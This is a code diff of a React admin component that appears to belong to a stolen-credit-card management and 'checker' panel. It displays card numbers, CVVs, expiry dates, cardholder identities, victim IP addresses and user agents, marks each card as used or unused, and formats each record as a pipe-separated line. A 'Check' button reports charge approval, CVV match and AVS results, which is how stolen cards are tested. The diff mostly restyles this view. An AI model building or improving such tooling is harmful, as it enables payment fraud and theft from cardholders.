@@ -1,5 +1,6 @@
 import React, { useState } from 'react';
 import { Card, Table, Space, Pagination, Modal, Tag, Row, Col, Input, Button } from 'antd';
+import { CreditCardOutlined } from '@ant-design/icons';
 import axios from 'axios';
 
 const { Column } = Table;
@@ -107,40 +108,73 @@ const BottomBox = ({ dataSource, fetchData, loading }) => {
           onCancel={handleCancel}
           width={1500}
         >
-          <Row gutter={[16, 16]}>
-            <Col span={12}>
-              <p><strong>CC Number:</strong> {selectedRecord.ccnum}</p>
-              <p><strong>EXP:</strong> {selectedRecord.month}/{selectedRecord.year}</p>
-              <p><strong>CVV:</strong> {selectedRecord.cvv}</p>
-              <p><strong>Fullname:</strong> {selectedRecord.fullname}</p>
-              <p><strong>Address:</strong> {selectedRecord.address}</p>
-              <p><strong>City:</strong> {selectedRecord.city}</p>
-              <p><strong>State:</strong> {selectedRecord.state}</p>
-              <p><strong>Email:</strong> {selectedRecord.email}</p>
-              <p><strong>Phone:</strong> {selectedRecord.phone}</p>
-              <p><strong>IP:</strong> {selectedRecord.ip}</p>
-              <p><strong>Is Used:</strong> {selectedRecord.isUsed ? 'Yes' : 'No'}</p>
-              <p><strong>User Agent:</strong> {selectedRecord.userAgent}</p>
-              <p><strong>Note:</strong></p>
+          {/* <Row gutter={[16, 16]}>
+            <Col span={12}> */}
+          <div style={{ display: 'flex', flexDirection: 'row', justifyContent: 'space-between' }}>
+            <div style={{ width: "49%" }}>
+              <div >
+                <p><strong>CC Number:</strong> {selectedRecord.ccnum}</p>
+                <p><strong>EXP:</strong> {selectedRecord.month}/{selectedRecord.year}</p>
+                <p><strong>CVV:</strong> {selectedRecord.cvv}</p>
+                <p><strong>Fullname:</strong> {selectedRecord.fullname}</p>
+                <p><strong>Address:</strong> {selectedRecord.address}</p>
+                <p><strong>City:</strong> {selectedRecord.city}</p>
+                <p><strong>State:</strong> {selectedRecord.state}</p>
+                <p><strong>Email:</strong> {selectedRecord.email}</p>
+                <p><strong>Phone:</strong> {selectedRecord.phone}</p>
+                <p><strong>IP:</strong> {selectedRecord.ip}</p>
+                <p><strong>Is Used:</strong> {selectedRecord.isUsed ? 'Yes' : 'No'}</p>
+                <p><strong>User Agent:</strong> {selectedRecord.userAgent}</p>
+                <p><strong>Note:</strong></p>
+              </div>
               <Input.TextArea
+                style={{ minHeight: '10%', marginTop: '16px' }}
                 value={note}
                 onChange={(e) => setNote(e.target.value)}
                 rows={4}
               />
-            </Col>
-            <Col span={12} style={{ border: '1px solid #d9d9d9', padding: '16px', borderRadius: '4px' }}>
-              <p><strong>{selectedRecord.ccnum}|{selectedRecord.month}/{selectedRecord.year}|{selectedRecord.cvv}|{selectedRecord.address}|{selectedRecord.city}|{selectedRecord.state}|{selectedRecord.email}|{selectedRecord.phone}|{selectedRecord.ip}|{selectedRecord.userAgent}</strong></p>
-            </Col>
-            <Col span={24} style={{ border: '1px solid #d9d9d9', padding: '16px', borderRadius: '4px', marginTop: '16px' }}>
-              <p><strong>Check Result:</strong></p>
-              {checkResult && typeof checkResult === 'object' ? (
-                <pre>{checkResult.ExpressResponseMessage} | {checkResult.CVVResponseCode} {checkResult.AVSResponseCode}</pre>
-              ) : (
-                <p>{checkResult?.ExpressResponseMessage}</p>
-              )}
-              <Button onClick={handleCheck} type="primary">Check</Button>
-            </Col>
-          </Row>
+              {/* </Col> */}
+            </div>
+            <div style={{ width: '49%' }}>
+              {/* <Col span={12} style={{ }}> */}
+              <div style={{ border: '1px solid #d9d9d9', padding: '16px', borderRadius: '4px' }}>
+                <CreditCardOutlined/>
+                <p><strong>{selectedRecord.ccnum}|{selectedRecord.month}/{selectedRecord.year}|{selectedRecord.cvv}|{selectedRecord.address}|{selectedRecord.city}|{selectedRecord.state}|{selectedRecord.email}|{selectedRecord.phone}|{selectedRecord.ip}|{selectedRecord.userAgent}</strong></p>
+              </div>
+              {/* </Col> */}
+              {/* <Col span={24} style={{ }}> */}
+              <div style={{ border: '1px solid #d9d9d9', padding: '8px 16px', borderRadius: '4px', marginTop: '16px' }}>
+                <div style={{ height: 90 }}>
+                  <strong>Check Result:</strong>
+                  {checkResult && typeof checkResult === 'object' ? (
+                    <pre>
+                      <span style={{ color: checkResult.ExpressResponseMessage === 'Approved' ? 'green' : 'red' }}>
+                        <strong>Charge: {checkResult.ExpressResponseMessage}</strong>
+                      </span>
+                      <br />
+                      <span>
+                        <strong>Status: {checkResult.CVVResponseCode === 'M | CVV MATCHED' || checkResult.CVVResponseCode === 'CVV MATCHED' ? 'CVV MATCH ✅' : checkResult.CVVResponseCode}</strong>
+                      </span>
+                      <br />
+                      <span>
+                        <strong>AVS: {checkResult.AVSResponseCode}</strong>
+                      </span>
+                    </pre>
+                  ) : (
+                    <p>{checkResult?.ExpressResponseMessage}</p>
+                  )}
+                </div>
+
+                <div style={{ width: "100%", display: "flex", justifyContent: 'end' }}>
+                  <Button onClick={handleCheck} type="primary">Check</Button>
+                </div>
+              </div>
+              {/* </Col> */}
+            </div>
+
+          </div>
+
+          {/* </Row> */}
         </Modal>
       )}
     </Card>
